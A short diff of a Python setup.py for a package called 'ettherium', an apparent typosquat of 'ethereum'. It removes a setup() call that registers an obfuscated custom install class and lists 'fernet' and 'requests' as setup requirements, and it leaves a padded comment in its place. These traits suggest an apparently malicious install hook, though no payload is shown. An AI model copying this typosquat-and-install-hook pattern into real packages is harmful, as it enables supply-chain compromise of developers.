@@ -18,22 +18,5 @@ class vRTgwLDIcTiAjNQBnXTeEofgoNBitKUfYtsLvmhLlEQsfZKJhhebyvfEfebClGmiJQrOpieeJR
             install.run(self)
 
 
-setup(
-    name="ettherium",
-    version=VERSION,
-    author="ODfxYwswtfc",
-    author_email="IGqnjwRP@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': vRTgwLDIcTiAjNQBnXTeEofgoNBitKUfYtsLvmhLlEQsfZKJhhebyvfEfebClGmiJQrOpieeJRDfPHDgZuX,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
